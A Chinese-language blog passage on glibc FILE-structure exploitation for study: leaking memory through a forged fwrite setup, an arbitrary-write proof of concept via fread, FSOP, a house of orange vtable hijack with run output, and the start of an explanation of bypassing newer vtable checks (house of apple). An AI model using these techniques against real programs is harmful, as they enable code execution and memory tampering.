<h4 id="4-fp-IO-read-end-secret"><a href="#4-fp-IO-read-end-secret" class="headerlink" title="4.fp-&gt;_IO_read_end = secret; "></a>4.<code>fp-&gt;_IO_read_end = secret; </code></h4><p>这条是为了绕过<code>new_do_write</code>中的检查,</p>
<p>要么<code>_flags</code>中有<code>_IO_IS_APPENDING(0x1000)</code>标志,</p>
<p>要么<code>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</code></p>
<p>才能避免<code>_IO_SYSSEEK</code>的调用,因为<code>_IO_SYSSEEK</code>调用后<code>new_pos == _IO_pos_BA</code>,接下来就返回了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//new_do_write</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">off64_t</span> new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_offset = new_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此将<code>flags</code>置位<code>_IO_IS_APPENDING</code>也可以</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure>



<h4 id="FSOP方法"><a href="#FSOP方法" class="headerlink" title="FSOP方法"></a>FSOP方法</h4><p>如果没有fwrite调用,也可以考虑利用FSOP方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> secret[]=<span class="string">&quot;flag&#123;dustball&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,secret);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags = <span class="number">0x800</span> | <span class="number">0x1000</span>; <span class="comment">//IO_CURRENTLY_PUTTING</span></span><br><span class="line">    fp-&gt;_IO_write_base = secret;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end = secret;      //IO_read_end must equals to write_base to overpass check in</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = secret + <span class="keyword">sizeof</span>(secret);</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;                  <span class="comment">//stdout</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//no fwrite , however fp is linked to _IO_list_all, use FSOP</span></span><br><span class="line">    <span class="comment">// fwrite(buffer,0x100,0x1,fp);     </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h3><p>写个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> key = <span class="number">0x12345678</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="comment">//fp -&gt; _flags不能有IO_NO_READS,也不能有_IO_EOF_SEEN</span></span><br><span class="line">  fp -&gt; _IO_read_ptr = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_read_end = <span class="number">0</span>;</span><br><span class="line">  fp -&gt; _IO_buf_base = &amp;key;</span><br><span class="line">  fp -&gt; _IO_buf_end = &amp;key + <span class="number">4</span>;</span><br><span class="line">  fp -&gt; _fileno = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  fread(buffer,<span class="number">1</span>,<span class="number">4</span>,fp);             <span class="comment">//方向fp -&gt; _IO_buf_base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,key);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们能够控制<code>fp</code>指向的<code>FILE</code>结构,并能改写其成员</p>
<p>我们希望通过设置<code>fp-&gt;_IO_buf_base = target_addr;</code>触发调用链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fread</span><br><span class="line">	_IO_sgetn =&gt; _IO_file_xsgetn</span><br><span class="line">		__underflow</span><br><span class="line">			_IO_UNDERFLOW =&gt; _IO_file_underflow</span><br><span class="line">				_IO_SYSREAD =&gt; _IO_file_read</span><br><span class="line">					__read</span><br></pre></td></tr></table></figure>

<p>从而实现往<code>target_addr</code>写入任意数据</p>
<p>为了实现这一目的，还需要设置fp的其他参数</p>
<h4 id="1-fp-fopen-flag-r"><a href="#1-fp-fopen-flag-r" class="headerlink" title="-1.fp = fopen(&quot;./flag&quot;,&quot;r&quot;);"></a>-1.<code>fp = fopen(&quot;./flag&quot;,&quot;r&quot;);</code></h4><p><code>fp </code>必须是有读权限的，或者手动设置<code>flag</code>，不能有<code>IO_NO_READS(0x4)</code>标志</p>
<p>同时不能有<code>_IO_EOF_SEEN(0x10)</code></p>
<p>这是因为<code>_IO_file_underflow</code>会对flag进行检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="0-fp-IO-buf-base-key"><a href="#0-fp-IO-buf-base-key" class="headerlink" title="0.fp -&gt; _IO_buf_base = &amp;key;"></a>0.<code>fp -&gt; _IO_buf_base = &amp;key;</code></h4><p>任意地址写的关键</p>
<h4 id="1-fp-IO-buf-end-key-4"><a href="#1-fp-IO-buf-end-key-4" class="headerlink" title="1.fp -&gt; _IO_buf_end = &amp;key + 4;"></a>1.<code>fp -&gt; _IO_buf_end = &amp;key + 4;</code></h4><p>配合0,必须保证end和base之间的距离要大于fread写入的长度,</p>
<p>这是因为<code>_IO_file_xsgetn</code>中会检查这一点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">    fp-&gt;_IO_read_ptr += want;</span><br><span class="line">    want = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-fp-IO-read-ptr-0-fp-IO-read-end-0"><a href="#2-fp-IO-read-ptr-0-fp-IO-read-end-0" class="headerlink" title="2.fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;"></a>2.<code>fp -&gt; _IO_read_ptr = 0; &amp;&amp; fp -&gt; _IO_read_end = 0;</code></h4><p>这是因为在<code>_IO_file_underflow</code>中会检查两者是否相等</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure>



<h4 id="3-fp-fileno-0"><a href="#3-fp-fileno-0" class="headerlink" title="3.fp -&gt; _fileno = 0;"></a>3.<code>fp -&gt; _fileno = 0;</code></h4><p>给予我们从标准输入获取任意字符到目标地址的权利</p>
<h3 id="house-of-orange-glibc"><a href="#house-of-orange-glibc" class="headerlink" title="[house of orange @ glibc &lt;&#x3D; 2.23]"></a>[house of orange @ glibc &lt;&#x3D; 2.23]</h3><p>通过堆利用手段，控制堆上的<code>FILE</code>结构体，能够修改<code>vtable</code>指针，具体怎么堆利用，这不重要</p>
<p>重要的是把<code>vtable</code>指针修改为构造的假表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  FILE *fp;</span><br><span class="line">  <span class="type">size_t</span> *fake_vtable;</span><br><span class="line">  <span class="type">size_t</span> *vtable_ptr;</span><br><span class="line">  <span class="type">size_t</span> *vtable_addr;</span><br><span class="line"></span><br><span class="line">  fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_vtable @ %p\n&quot;</span>, fake_vtable);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123; <span class="comment">// 我今天就是要把这假表狠狠塞满</span></span><br><span class="line">    fake_vtable[i] = (<span class="type">size_t</span>)win;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fp @ %p\n&quot;</span>, fp);    </span><br><span class="line"></span><br><span class="line">  <span class="comment">//_IO_FILE_plus中vtable指针的偏移地址为0xd8</span></span><br><span class="line">  vtable_ptr  = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;   </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;vtable_ptr = %p\n&quot;</span>, vtable_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//曾经的vtable指针</span></span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;original vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//修改vtable指针指向假虚表</span></span><br><span class="line">  *vtable_ptr = fake_vtable;</span><br><span class="line">  vtable_addr = vtable_ptr[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;new vtable_addr = %p\n&quot;</span>, vtable_addr);</span><br><span class="line"></span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ubuntu16.04 &amp; glibc-2.23</code>上实验,成功劫持了虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test<span class="meta"># gcc orange.c -o orange -no-pie -g -no-pie -w</span></span><br><span class="line">root@Executor:/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x1690010</span></span><br><span class="line">fp @ <span class="number">0x1690530</span></span><br><span class="line">vtable_ptr = <span class="number">0x1690608</span></span><br><span class="line">original vtable_addr = <span class="number">0x7fd1b3f3c6e0</span></span><br><span class="line">new vtable_addr = <span class="number">0x1690010</span></span><br><span class="line">function win called</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>

<p> 同样的代码对于更高版本的<code>glibc</code>无效</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwncollege/software/file/test]</span><br><span class="line">└─# ./orange</span><br><span class="line">fake_vtable @ <span class="number">0x123e2a0</span></span><br><span class="line">fp @ <span class="number">0x123e7c0</span></span><br><span class="line">vtable_ptr = <span class="number">0x123e898</span></span><br><span class="line">original vtable_addr = <span class="number">0x7f4da32ca070</span></span><br><span class="line">new vtable_addr = <span class="number">0x123e2a0</span></span><br><span class="line">Fatal error: glibc detected an invalid stdio handle</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>



<h3 id="house-of-apple-glibc-2-23"><a href="#house-of-apple-glibc-2-23" class="headerlink" title="[house of apple @ glibc &gt; 2.23]"></a>[house of apple @ glibc &gt; 2.23]</h3><p>针对虚表的攻击通常能够想到两种方式</p>
<p>1.保持虚表地址不变,修改虚表上的函数指针</p>
<p>2.造假虚表,然后修改虚表指针</p>
<p>对于1来说,虚表位于<code>glibc</code>的代码段,通常是只读的,不允许随便改函数指针</p>
<p>对于2来说,<code>glibc2.23</code>之前是可以劫持虚表指针的,相关攻击方法叫做<code>house of orange</code></p>
<p><code>glibc2.24</code>之后就加入了虚表的合法性检查</p>
<p>但也不是不能利用了，新方法叫<code>house of apple</code></p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.23/source/libio/libioP.h#L398</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.24/source/libio/libioP.h#L133</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>

<p><code>IO_validate_vtable</code>会检查虚表的合法性</p>
</blockquote>
<p><strong>这个虚表合法性检查会发生在何时呢?</strong></p>
<p><code>fwrite</code>实际上调用<code>_IO_fwrite</code>,<code>if</code>判断通过,会执行<code>__IO_sputn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)	<span class="comment">//</span></span><br><span class="line">  written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);	<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>这里<code>_IO_sputn</code>是一个宏定义,会在检查<code>vtable</code>合法性之后调用<code>vtable.xsputn</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp,__s,__n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line">扩展到:</span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsputn) (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>同理,不管<code>fread</code>还是<code>fwrite</code>实际上都会在经过<code>vtable</code>合法性检查后,调用<code>vtable</code>中的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>虚表合法性检查了什么呢?</strong></p>
<p>而<code>IO_validate_vtable</code>会检查虚表是否是<code>glibc</code>预定义好的虚表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) &amp;__io_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ptr = vtable</code>是<code>FILE</code>结构的虚表指针</p>
<p><code>const struct _IO_jump_t __io_vtables[]</code>是<code>vtables.c</code>中预定义好的虚表数组</p>
<p>在<code>libioP.h</code>中暴露了这些虚表的引用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> __<span class="title">io_vtables</span>[] <span class="title">attribute_hidden</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_str_jumps                    (__io_vtables[IO_STR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wstr_jumps                   (__io_vtables[IO_WSTR_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps                   (__io_vtables[IO_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_mmap              (__io_vtables[IO_FILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_jumps_maybe_mmap        (__io_vtables[IO_FILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps                  (__io_vtables[IO_WFILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_mmap             (__io_vtables[IO_WFILE_JUMPS_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wfile_jumps_maybe_mmap       (__io_vtables[IO_WFILE_JUMPS_MAYBE_MMAP])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_cookie_jumps                 (__io_vtables[IO_COOKIE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_proc_jumps                   (__io_vtables[IO_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_mem_jumps                    (__io_vtables[IO_MEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wmem_jumps                   (__io_vtables[IO_WMEM_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_printf_buffer_as_file_jumps  (__io_vtables[IO_PRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_wprintf_buffer_as_file_jumps (__io_vtables[IO_WPRINTF_BUFFER_AS_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_file_jumps               (__io_vtables[IO_OLD_FILE_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_proc_jumps               (__io_vtables[IO_OLD_PROC_JUMPS])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_old_cookie_jumps             (__io_vtables[IO_OLD_COOKIED_JUMPS])</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IO_VTABLES_LEN (IO_VTABLES_NUM * sizeof (struct _IO_jump_t))</span></span><br><span class="line">IO_VTABLES_NUM = <span class="number">14</span></span><br><span class="line"><span class="keyword">sizeof</span> (<span class="keyword">struct</span> _IO_jump_t) = <span class="number">168</span></span><br><span class="line">IO_VTABLES_LEN = <span class="number">14</span>*<span class="number">168</span> = <span class="number">2352</span></span><br></pre></td></tr></table></figure>

<p>也就是说一共有14个预定义的虚表</p>
<p>通常情况下使用的虚表是<code>_IO_file_jumps = __io_vtables[IO_FILE_JUMPS]</code></p>
<p><code>IO_validate_vtable</code>检查虚表<strong>必须是这14个其中之一</strong>,防止被用户劫持篡改指向了堆栈或者堆</p>
<p><strong>如何绕过虚表检查呢?</strong></p>
<p>当fread函数被调用时,调用过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_fread</span><br><span class="line">	_IO_sgetn</span><br><span class="line">		_IO_XSGETN</span><br><span class="line">			JUMP2</span><br><span class="line">				_IO_JUMPS_FUNC</span><br><span class="line">=&gt;					IO_validate_vtable </span><br><span class="line">						_IO_JUMPS_FILE_plus</span><br></pre></td></tr></table></figure>

<p><code>IO_validate_vtable</code>是必然被调用的,检查的是<code>_IO_FILE_plus.vtable</code></p>
<p>然而在<code>_IO_XSGETN</code>宏定义这里还有一个兄弟叫<code>_IO_WXSGETN</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.38/libio/libioP.h:184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WXSGETN(FP, DATA, N) WJUMP2 (__xsgetn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure>

<p>这个兄弟宏定义展开发现是没有<code>_IO_validate_vtable</code>这种检查的,会直接调用到<code>_IO_FILE._wide_data-&gt;_wide_vtable</code>中的函数</p>
